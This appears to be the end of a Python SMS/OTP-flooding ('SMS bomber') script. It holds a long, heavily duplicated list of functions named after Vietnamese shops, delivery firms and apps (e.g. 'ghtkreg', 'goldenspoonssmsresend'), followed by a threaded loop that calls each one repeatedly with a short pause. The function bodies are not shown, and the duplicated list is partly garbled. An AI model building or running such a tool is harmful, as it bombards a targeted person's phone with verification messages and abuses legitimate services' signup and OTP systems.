    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    
    
]

with concurrent.futures.ThreadPoolExecutor() as executor:
    for i in range(count):
        for func in functions:
            # Gọi hàm và gửi vào ThreadPoolExecutor
            executor.submit(func)
            # Nghỉ giữa các lần gọi hàm
            time.sleep(0.5)  # Điều chỉnh thời gian nghỉ tùy theo nhu cầu
